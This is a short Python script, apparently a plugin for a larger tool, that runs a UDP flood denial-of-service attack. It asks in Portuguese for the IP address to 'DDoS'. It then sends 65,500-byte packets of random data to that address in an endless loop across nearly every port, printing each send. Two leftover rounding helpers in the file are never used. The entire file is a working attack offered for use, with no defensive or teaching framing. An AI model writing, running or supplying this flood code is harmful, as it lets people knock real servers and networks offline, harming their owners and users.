import time
import socket
import random

def run(functions):
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	ip = functions['selfInput']("Qual é o ip que eu irei dar ddos?\n")

	def ceil_floor(x):
			import math
			return math.ceil(x) if x < 0 else math.floor(x)

	def round_n_digits(x, n):
			import math
			return ceil_floor(x * math.pow(10, n)) / math.pow(10, n)

	port = 1
	sent = 65500
	while True:
		sock.sendto(random._urandom(sent), (ip,port))
		port = port + 1
		functions['colorize'](f":red:{sent} bytes:: para :blue:{ip}:: na porta :blue:{port}::", True)
		if port == 65534:
			port = 1